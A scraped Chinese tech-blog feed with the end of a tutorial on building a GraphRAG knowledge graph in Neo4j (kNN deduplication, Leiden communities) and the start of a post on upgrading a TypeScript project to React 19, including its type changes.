<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 导入GraphDataScience库  </span>
from graphdatascience import GraphDataScience  
  
<span class="hljs-comment"># --- GDS客户端初始化 ---  </span>
<span class="hljs-comment"># 初始化GraphDataScience客户端以连接到Neo4j数据库  </span>
<span class="hljs-comment"># 使用环境变量中的连接详情（URI、用户名、密码）  </span>
<span class="hljs-attr">gds</span> = GraphDataScience(  
    os.environ<span class="hljs-section">["NEO4J_URI"]</span>,  
    <span class="hljs-attr">auth</span>=(os.environ[<span class="hljs-string">"NEO4J_USERNAME"</span>], os.environ[<span class="hljs-string">"NEO4J_PASSWORD"</span>]),  
)  
<span class="hljs-comment"># 为GDS操作设置特定数据库  </span>
gds.set_database(os.environ<span class="hljs-section">["DATABASE"]</span>)  
  
<span class="hljs-comment"># --- 内存图投影 ---  </span>
<span class="hljs-comment"># 将图谱投影到内存中以便GDS算法高效处理  </span>
<span class="hljs-comment"># 此投影命名为'entities'  </span>
G, <span class="hljs-attr">result</span> = gds.graph.project(  
    "entities",                   <span class="hljs-comment"># 内存图的名称  </span>
    "__Entity__",                 <span class="hljs-comment"># 要投影的节点标签  </span>
    "*",                          <span class="hljs-comment"># 投影所有关系类型  </span>
    <span class="hljs-attr">nodeProperties</span>=[<span class="hljs-string">"embedding"</span>]  <span class="hljs-comment"># 包含节点的'embedding'属性  </span>
)  
  
<span class="hljs-comment"># --- 使用kNN计算相似性 ---  </span>
<span class="hljs-comment"># 定义创建关系的相似性阈值  </span>
<span class="hljs-attr">similarity_threshold</span> = <span class="hljs-number">0.95</span>  
  
<span class="hljs-comment"># 使用k-Nearest Neighbors（kNN）算法找到相似节点  </span>
<span class="hljs-comment"># 这会通过添加新关系“变异”内存图  </span>
gds.knn.mutate(  
    G,                                  <span class="hljs-comment"># 要修改的内存图  </span>
    <span class="hljs-attr">nodeProperties</span>=[<span class="hljs-string">"embedding"</span>],       <span class="hljs-comment"># 用于相似性计算的属性  </span>
    <span class="hljs-attr">mutateRelationshipType</span>=<span class="hljs-string">"SIMILAR"</span>,   <span class="hljs-comment"># 要创建的关系类型  </span>
    <span class="hljs-attr">mutateProperty</span>=<span class="hljs-string">"score"</span>,             <span class="hljs-comment"># 新关系上存储相似性分数的属性  </span>
    <span class="hljs-attr">similarityCutoff</span>=similarity_threshold, <span class="hljs-comment"># 过滤关系的阈值  </span>
)
</code></pre>
<p>我们为嵌入相似性分数高于0.95的节点创建<code>SIMILAR</code>关系。</p>
<p>kNN算法帮助我们找到了潜在的重复实体，但仅靠文本相似性并不完美。我们可以通过寻找不仅语义相似而且名称非常相似的实体（低“编辑距离”）进一步优化。</p>
<p>我们将查询这些候选实体，然后使用LLM做出最终的合并决定。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 根据社区和名称相似性查询潜在重复实体  </span>
word_edit_distance = <span class="hljs-number">3</span>  
potential_duplicate_candidates = graph.query(  
    <span class="hljs-string">"""  
    MATCH (e:`__Entity__`)  
    WHERE size(e.id) &gt; 4  
    WITH e.wcc AS community, collect(e) AS nodes, count(*) AS count  
    WHERE count &gt; 1  
    # ... (笔记本中的完整Cypher查询) ...  
    RETURN distinct(combinedResult)  
    """</span>,  
    params={<span class="hljs-string">"distance"</span>: word_edit_distance},  
)
</code></pre>
<p>上述代码的输出如下。</p>
<h4 data-id="heading-18">输出</h4>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[{<span class="hljs-string">'combinedResult'</span>: [<span class="hljs-string">'David Van'</span>, <span class="hljs-string">'Davidvan'</span>]</span>},  
 {'combinedResult': [<span class="hljs-string">'Cyb003'</span>, <span class="hljs-string">'Cyb004'</span>]},  
 {'combinedResult': [<span class="hljs-string">'Delta Air Lines'</span>, <span class="hljs-string">'Delta_Air_Lines'</span>]},  
 {'combinedResult': [<span class="hljs-string">'Elon Musk'</span>, <span class="hljs-string">'Elonmusk'</span>]},  
 {'combinedResult': [<span class="hljs-string">'Market'</span>, <span class="hljs-string">'Markets'</span>]}]
</code></pre>
<p>这些看起来明显是重复的。我们现在可以使用另一个BAML函数让LLM决定保留哪个名称。运行这个分辨过程后，我们在Neo4j中合并这些节点。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># (假设'merged_entities'由LLM分辨过程创建)  </span>
graph.query(  
    <span class="hljs-string">"""  
    UNWIND $data AS candidates  
    CALL {  
      WITH candidates  
      MATCH (e:__Entity__) WHERE e.id IN candidates  
      RETURN collect(e) AS nodes  
    }  
    CALL apoc.refactor.mergeNodes(nodes, {properties: {'`.*`': 'discard'}})  
    YIELD node  
    RETURN count(*)  
    """</span>,  
    params={<span class="hljs-string">"data"</span>: merged_entities},  
)
</code></pre>
<hr/>
<h2 data-id="heading-19">使用Leiden算法进行社区检测</h2>
<p>现在是GraphRAG的核心：将相关实体分组为社区。</p>
<p>我们将投影整个图谱（包括所有原始关系）到内存中，并运行Leiden算法，这是一个最先进的社区检测算法。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 投影整个图谱，按关系频率加权  </span>
G, result = gds.graph.project(  
    <span class="hljs-string">"communities"</span>,  
    <span class="hljs-string">"__Entity__"</span>,  
    {  
        <span class="hljs-string">"_ALL_"</span>: {  
            <span class="hljs-string">"type"</span>: <span class="hljs-string">"*"</span>,  
            <span class="hljs-string">"orientation"</span>: <span class="hljs-string">"UNDIRECTED"</span>,  
            <span class="hljs-string">"properties"</span>: {<span class="hljs-string">"weight"</span>: {<span class="hljs-string">"property"</span>: <span class="hljs-string">"*"</span>, <span class="hljs-string">"aggregation"</span>: <span class="hljs-string">"COUNT"</span>}},  
        }  
    },  
)  
  
<span class="hljs-comment"># 运行Leiden社区检测并将结果写回节点  </span>
gds.leiden.write(  
    G,  
    writeProperty=<span class="hljs-string">"communities"</span>,  
    includeIntermediateCommunities=<span class="hljs-literal">True</span>, <span class="hljs-comment"># 这会创建层次社区  </span>
    relationshipWeightProperty=<span class="hljs-string">"weight"</span>,  
)
</code></pre>
<p>这会为每个实体节点添加一个communities属性，这是一个不同粒度级别的社区ID列表（从小型紧密群体到更大的广泛主题）。</p>
<p>最后，我们通过创建<code>__Community__</code>节点并将它们链接起来，将这个层次结构具体化在图谱中。这创建了一个可浏览的主题结构。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 为社区节点创建唯一性约束  </span>
graph.query(<span class="hljs-string">"CREATE CONSTRAINT IF NOT EXISTS FOR (c:__Community__) REQUIRE c.id IS UNIQUE;"</span>)  
  
<span class="hljs-comment"># 创建社区节点并将实体和社区链接起来  </span>
graph.query(  
    <span class="hljs-string">"""  
    MATCH (e:`__Entity__`)  
    UNWIND range(0, size(e.communities) - 1 , 1) AS index  
    // ... (笔记本中的完整社区创建查询) ...  
    RETURN count(*)  
    """</span>  
)
</code></pre>
<p>这个复杂查询创建了一个多级社区结构，例如：<code>(Entity)-[:IN_COMMUNITY]-&gt;(Level_0_Community)-[:IN_COMMUNITY]-&gt;(Level_1_Community)</code>。</p>
<hr/>
<h2 data-id="heading-20">分析最终图谱结构</h2>
<p>经过所有这些工作，我们的知识图谱是什么样的？让我们分析每一级的社区规模。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 查询每一级社区的大小  </span>
community_size = graph.query(  
    <span class="hljs-string">"""  
    MATCH (c:__Community__)&lt;-[:IN_COMMUNITY*]-(e:__Entity__)  
    WITH c, count(distinct e) AS entities  
    RETURN split(c.id, '-')[0] AS level, entities  
    """</span>  
)  
  
<span class="hljs-comment"># 打印处理后的DataFrame  </span>
percentiles_df
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97ef69e292184371a2986601383edd74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592436&amp;x-signature=xAECYudwtDA%2F5YDFqzoF%2Ba3ssMs%3D" alt="" loading="lazy"/></p>
<p><strong>百分位DataFrame</strong></p>
<p>这个表格很重要。它显示了Leiden算法如何对我们的1,875个实体进行分组。</p>
<p>在Level 0，我们有858个小型、聚焦的社区，其中90%包含4个或更少的成员。 到Level 3，算法将这些合并为732个更大、更广泛的社区，这一级的最大社区包含77个实体。</p>
<p>这种层次结构正是我们进行有效GraphRAG所需的。我们现在可以在不同抽象级别进行检索。</p>
<hr/>
<h2 data-id="heading-21">结论</h2>
<p>结果很明显。虽然标准的LangChain工具提供了一个快速入门的途径，但它们在与较小的开源LLM一起使用时可能不稳定且不可靠。</p>
<p>通过引入BAML，我们解决了过于复杂的提示和严格JSON解析的核心问题。结果是将成功率从25%大幅提升到超过99%，将一个失败的实验转变为一个稳健且可扩展的知识图谱构建流程。</p>
<p>以下是我们采取的关键步骤的快速回顾：</p>
<ol>
<li>我们从准备新闻文章数据集和使用Ollama设置本地llama3模型开始。</li>
<li>使用LangChain的LLMGraphTransformer进行的第一次测试有75%的失败率，因为严格的JSON解析。</li>
<li>尝试通过高级提示工程修复，失败率仅略微改善到约62%。</li>
<li>然后我们集成了BAML，利用其简化的schema和鲁棒解析器实现了99.4%的图谱提取成功率。</li>
<li>将高质量的图谱数据加载到Neo4j中进行结构化和分析。</li>
<li>通过为所有实体生成向量嵌入来丰富图谱，捕捉语义含义。</li>
<li>使用k-Nearest Neighbors（kNN）算法识别并链接语义相似的节点。</li>
<li>进一步通过LLM智能查找和合并重复实体来优化图谱。</li>
<li>最后，应用Leiden算法将实体组织成多级社区层次结构，为高级GraphRAG奠定了基础。</li>
</ol>
<p>这种使用LangChain进行强大编排和BAML进行可靠结构化输出的方法是构建强大且成本效益高的AI应用的制胜组合。</p>
<h2 data-id="heading-22">学习资源推荐</h2>
<p>如果你想更深入地学习大模型，以下是一些非常有价值的学习资源，这些资源将帮助你从不同角度学习大模型，提升你的实践能力。</p>
<blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TS 项目升级 React 18 到 19 的一些事情]]></title>    <link>https://juejin.cn/post/7576026767372451859</link>    <guid>https://juejin.cn/post/7576026767372451859</guid>    <pubDate>2025-11-24T12:33:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576026767372451859" data-draft-id="7576223441683726399" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TS 项目升级 React 18 到 19 的一些事情"/> <meta itemprop="keywords" content="前端,React.js,TypeScript"/> <meta itemprop="datePublished" content="2025-11-24T12:33:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="驳是"/> <meta itemprop="url" content="https://juejin.cn/user/442445375748621"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TS 项目升级 React 18 到 19 的一些事情
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/442445375748621/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    驳是
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T12:33:38.000Z" title="Mon Nov 24 2025 12:33:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{font-family:-apple-system,BlinkMacSystemFont,PingFang SC,Helvetica Neue,Helvetica,Arial,sans-serif;word-break:break-word;line-height:1.75;font-weight:200;font-size:16px;overflow-x:hidden;color:#666;letter-spacing:.5px}.markdown-body a{text-decoration:none;color:#0064c8;position:relative}.markdown-body a:after{content:"";position:absolute;bottom:-2px;left:0;width:100%;height:1px;background-color:rgba(0,100,200,.7);transform:scale(0);transition:all .4s ease-in-out}.markdown-body a:link:hover:after{transform:scale(1)}.markdown-body code{padding:2px 4px;font-size:.9em;font-family:Menlo,Monaco,Consolas,Courier New,monospace;border-radius:2px;background-color:rgba(0,46,70,.0431);color:#39f}.markdown-body strong{font-weight:400}.markdown-body em{color:#ff6a00}.markdown-body del,.markdown-body s{color:#bbb}.markdown-body small{font-size:.8em;color:#bbb}.markdown-body kbd{margin:0 .1em;padding:5px 8px 3px;border:1px solid #d1d5d9;border-radius:3px;box-shadow:0 1px 0 0 #e3e4e6,inset 0 0 0 2px #fff;background-color:#eee;font-weight:600;font-size:.8em;font-family:Arial,Helvetica Neue,Helvetica,sans-serif;white-space:nowrap;color:#666}.markdown-body kbd:first-child{margin-left:0}.markdown-body kbd:last-child{margin-right:0}.markdown-body img{display:block;border:0;max-width:calc(100% - 20px);min-width:20px;min-height:20px;margin:0 10px;box-shadow:0 2px 8px 2px rgba(0,0,0,.2);transition:all .25s ease-in-out}.markdown-body img:hover{transform:translateY(-4px)}.markdown-body blockquote,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{line-height:inherit;font-size:inherit;color:inherit}.markdown-body blockquote:first-child,.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child,.markdown-body ol:first-child,.markdown-body p:first-child,.markdown-body pre:first-child,.markdown-body table:first-child,.markdown-body ul:first-child{margin-top:0}.markdown-body blockquote:last-child,.markdown-body h1:last-child,.markdown-body h2:last-child,.markdown-body h3:last-child,.markdown-body h4:last-child,.markdown-body h5:last-child,.markdown-body h6:last-child,.markdown-body ol:last-child,.markdown-body p:last-child,.markdown-body pre:last-child,.markdown-body table:last-child,.markdown-body ul:last-child{margin-bottom:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:1.6em 0 .6em;color:#333;font-weight:400;position:relative}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{position:absolute;left:-2em}.markdown-body h1{font-size:1.75em}.markdown-body h1:before{content:"#"}.markdown-body h1:first-child{margin-top:0}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.35em}.markdown-body h4{font-size:1.2em}.markdown-body h5{font-size:1.1em}.markdown-body h6{font-size:1em}.markdown-body blockquote,.markdown-body ol,.markdown-body pre,.markdown-body table,.markdown-body ul{margin:1em 0}.markdown-body p{margin:.7em 0;word-break:break-word}.markdown-body pre{padding:8px 12px;color:#666;background-color:rgba(0,46,70,.0431);border:1px solid #ebebeb;tab-size:4;white-space:pre-wrap;line-height:1.4}.markdown-body pre code{color:inherit;background-color:transparent;padding:0}.markdown-body ol,.markdown-body ul{margin:1em 0 1em 2em;padding:0;line-height:1.5!important;font-size:inherit;color:inherit}.markdown-body ol:first-child,.markdown-body ul:first-child{margin-top:0}.markdown-body ol:last-child,.markdown-body ul:last-child{margin-bottom:0}.markdown-body ol li,.markdown-body ul li{margin:.5em 0;list-style:inherit}.markdown-body ul{list-style:disc outside}.markdown-body ul ul{list-style-type:circle}.markdown-body ul ul ul{list-style-type:square}.markdown-body ol{list-style:decimal outside}.markdown-body ol ol{list-style-type:lower-alpha}.markdown-body ol ol ol{list-style-type:lower-roman}.markdown-body blockquote{font-size:.9em;padding:8px 20px 8px 15px;color:#666;border-left:5px solid rgba(0,100,200,.7);background-color:rgba(0,100,200,.1)}.markdown-body table{border-collapse:collapse;border-spacing:0;max-width:100%;min-width:50%;word-wrap:break-word;color:inherit}.markdown-body table thead tr{background-color:#f4f6f7}.markdown-body table td,.markdown-body table th{padding:4px 16px;font-size:.95em;text-align:left;color:inherit;border:0;min-width:72px}.markdown-body table td[align=center],.markdown-body table th[align=center]{text-align:center}.markdown-body table td[align=right],.markdown-body table th[align=right]{text-align:right}.markdown-body table th{border-bottom:2px solid #e3e4e6;color:#333;font-weight:400;white-space:nowrap}.markdown-body table td{border-bottom:1px solid #ebebeb}.markdown-body hr{margin:1.5em 0;padding:0;border:0;background:linear-gradient(90deg,rgba(0,46,70,.0431),#ebebeb 50%,rgba(0,46,70,.0431));height:1px}.markdown-body br{content:"";display:block}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18e1c0f0a29a4392a7cf9d0afe6e3785~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6amz5piv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592418&amp;x-signature=%2B7IQG%2FMZSLkWzxIFK7ZpTiC6hYM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">🎙️ 前言</h2>
<p>React 19 出来已经快有一年了，<a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2024%2F12%2F05%2Freact-19" target="_blank" title="https://react.dev/blog/2024/12/05/react-19" ref="nofollow noopener noreferrer">公告</a> 在 24 年 12 月就出了，然即使身为「升级狂魔」的我，也没有第一时间进行升级。只因为我深知 React 的每次大版本升级，都将在社区掀起一阵腥风血雨，从构建到组件库再到各种 Linter 都需要紧跟其脚步，只好一等再等。</p>
<p>其实主要是因为项目依赖了 Antd，而 Antd 5 并没有官方宣称支持 React 19，所以只好竭力按耐住渴望升级的欲火。昨天（2025/11/23），距离 React 19 第一版过去了将近整整一年（真墨迹...），看到 Antd 推了 6.0.0，时机终于到了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/002ddc13ba074db89c37475ff15df1c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6amz5piv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592418&amp;x-signature=fb%2FofaFdYRpWmuiy%2BbLN1vqw9n4%3D" alt="" loading="lazy"/></p>
<p>React 19 升级公告的具体内容这里就不啰嗦了，已经有好多人聊过，个人比较关注的有以下几个：</p>
<ol>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2024%2F12%2F05%2Freact-19%23ref-as-a-prop" target="_blank" title="https://react.dev/blog/2024/12/05/react-19#ref-as-a-prop" ref="nofollow noopener noreferrer"><code>forwardRef</code> 终于开始要退出历史舞台</a> 🎉🎉🎉</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2024%2F12%2F05%2Freact-19%23context-as-a-provider" target="_blank" title="https://react.dev/blog/2024/12/05/react-19#context-as-a-provider" ref="nofollow noopener noreferrer"><code>Context.Provider</code> 可以直接用 <code>Context</code> 代替</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2024%2F12%2F05%2Freact-19%23new-feature-use" target="_blank" title="https://react.dev/blog/2024/12/05/react-19#new-feature-use" ref="nofollow noopener noreferrer">use</a>，注意它不是 <code>hook</code></li>
<li>Ref 相关的类型变更</li>
</ol>
<h2 data-id="heading-1">🪁 如何升级</h2>
<p>官方提供了 <a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2024%2F04%2F25%2Freact-19-upgrade-guide" target="_blank" title="https://react.dev/blog/2024/04/25/react-19-upgrade-guide" ref="nofollow noopener noreferrer">升级文档</a>，提到升级工具：</p>
<pre><code class="hljs language-shell" lang="shell">npx codemod@latest react/19/migration-recipe
</code></pre>
<p>以我的项目来讲，可能由于一直关注依赖升级，这一步并没有动任何代码。</p>
<p>作为 TS 项目，还需要：</p>
<pre><code class="hljs language-shell" lang="shell">npx types-react-codemod@latest preset-19 ./path-to-app
</code></pre>
<p>然而它会给所有的 <code>ReactElement</code> 改成 <code>ReactElement&lt;any&gt;</code>，还得叫我替换还原回来。</p>
<h2 data-id="heading-2">👻 实际问题</h2>
<p>接下来主要来讲一下我在升级中遇到的问题，主要是 TS 的类型问题。</p>
<h3 data-id="heading-3">forwardRef</h3>
<p>终于可以用 <code>props.ref</code> 代替臭名昭著的 <code>forwardRef</code>，我认为这是最令人欣喜的新特性。被 <code>forwardRef</code> 折磨了这许久，终于 React 要干掉它了。</p>
<p>但对于 TS 代码来说，可能会遇到一些问题，比如我之前这么写（<code>ref</code> 没有写成可选参数）：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComp</span>(<span class="hljs-params">props: MyCompProps, ref: Ref&lt;MyCompRef&gt;</span>): <span class="hljs-title class_">ReactElement</span>;
</code></pre>
<p>升级 19 后会报错签名不符，如下图：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0efb7172a8c24ec189468a2ab870b0e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6amz5piv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592418&amp;x-signature=mMk6ZnC1oxiRQkBbski9dvbWhDY%3D" alt="" loading="lazy"/></p>
<p>这种情况，如果是 NPM 包，建议先发个兼容包，改 <code>ref</code> 为可选即可（然后再发最低依赖为 19 的大版本包）：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComp</span>(<span class="hljs-params">props: MyCompProps, ref?: Ref&lt;MyCompRef&gt;</span>): <span class="hljs-title class_">ReactElement</span>;
</code></pre>
<h3 data-id="heading-4">useReducer</h3>
<p>会写 TS 的人都知道，同一个方法，使用泛型的话，可以有多种不同的定义方式，好的定义能让开发者事半功倍。</p>
<p><code>useReducer</code> 的类型定义就变了，其实升级文档里有提到，但心急的开发者估计会看漏，<a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2024%2F04%2F25%2Freact-19-upgrade-guide%23better-usereducer-typings" target="_blank" title="https://react.dev/blog/2024/04/25/react-19-upgrade-guide#better-usereducer-typings" ref="nofollow noopener noreferrer">Better useReducer typings</a>，而且 Codemod 工具并不会修正这里的问题。</p>
<p>所以对于类型定义完整的 TS 项目，会有冲击，导致构建失败。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// React 18 的 `useReducer` 5 个重载</span>
<span class="hljs-keyword">function</span> useReducer&lt;R <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ReducerWithoutAction</span>&lt;<span class="hljs-built_in">any</span>&gt;, I&gt;(
    <span class="hljs-attr">reducer</span>: R,
    <span class="hljs-attr">initializerArg</span>: I,
    <span class="hljs-attr">initializer</span>: <span class="hljs-function">(<span class="hljs-params">arg: I</span>) =&gt;</span> <span class="hljs-title class_">ReducerStateWithoutAction</span>&lt;R&gt;
): [<span class="hljs-title class_">ReducerStateWithoutAction</span>&lt;R&gt;, <span class="hljs-title class_">DispatchWithoutAction</span>];

<span class="hljs-keyword">function</span> useReducer&lt;R <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ReducerWithoutAction</span>&lt;<span class="hljs-built_in">any</span>&gt;&gt;(
    <span class="hljs-attr">reducer</span>: R,
    <span class="hljs-attr">initializerArg</span>: <span class="hljs-title class_">ReducerStateWithoutAction</span>&lt;R&gt;,
    initializer?: <span class="hljs-literal">undefined</span>
): [<span class="hljs-title class_">ReducerStateWithoutAction</span>&lt;R&gt;, <span class="hljs-title class_">DispatchWithoutAction</span>];

<span class="hljs-keyword">function</span> useReducer&lt;R <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Reducer</span>&lt;<span class="hljs-built_in">any</span>, <span class="hljs-built_in">any</span>&gt;, I&gt;(
    <span class="hljs-attr">reducer</span>: R,
    <span class="hljs-attr">initializerArg</span>: I &amp; <span class="hljs-title class_">ReducerState</span>&lt;R&gt;,
    <span class="hljs-attr">initializer</span>: <span class="hljs-function">(<span class="hljs-params">arg: I &amp; ReducerState&lt;R&gt;</span>) =&gt;</span> <span class="hljs-title class_">ReducerState</span>&lt;R&gt;
): [<span class="hljs-title class_">ReducerState</span>&lt;R&gt;, <span class="hljs-title class_">Dispatch</span>&lt;<span class="hljs-title class_">ReducerAction</span>&lt;R&gt;&gt;];

<span class="hljs-keyword">function</span> useReducer&lt;R <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Reducer</span>&lt;<span class="hljs-built_in">any</span>, <span class="hljs-built_in">any</span>&gt;, I&gt;(
    <span class="hljs-attr">reducer</span>: R,
    <span class="hljs-attr">initializerArg</span>: I,
    <span class="hljs-attr">initializer</span>: <span class="hljs-function">(<span class="hljs-params">arg: I</span>) =&gt;</span> <span class="hljs-title class_">ReducerState</span>&lt;R&gt;
): [<span class="hljs-title class_">ReducerState</span>&lt;R&gt;, <span class="hljs-title class_">Dispatch</span>&lt;<span class="hljs-title class_">ReducerAction</span>&lt;R&gt;&gt;];

<span class="hljs-keyword">function</span> useReducer&lt;R <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Reducer</span>&lt;<span class="hljs-built_in">any</span>, <span class="hljs-built_in">any</span>&gt;&gt;(
    <span class="hljs-attr">reducer</span>: R,
    <span class="hljs-attr">initialState</span>: <span class="hljs-title class_">ReducerState</span>&lt;R&gt;,
    initializer?: <span class="hljs-literal">undefined</span>
): [<span class="hljs-title class_">ReducerState</span>&lt;R&gt;, <span class="hljs-title class_">Dispatch</span>&lt;<span class="hljs-title class_">ReducerAction</span>&lt;R&gt;&gt;];

<span class="hljs-comment">// React 19 的 `useReducer` 只剩下了两种</span>
<span class="hljs-keyword">function</span> useReducer&lt;S, A <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AnyActionArg</span>&gt;(
    <span class="hljs-attr">reducer</span>: <span class="hljs-function">(<span class="hljs-params">prevState: S, ...args: A</span>) =&gt;</span> S,
    <span class="hljs-attr">initialState</span>: S
): [S, <span class="hljs-title class_">ActionDispatch</span>&lt;A&gt;];

<span class="hljs-keyword">function</span> useReducer&lt;S, I, A <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AnyActionArg</span>&gt;(
    <span class="hljs-attr">reducer</span>: <span class="hljs-function">(<span class="hljs-params">prevState: S, ...args: A</span>) =&gt;</span> S,
    <span class="hljs-attr">initialArg</span>: I,
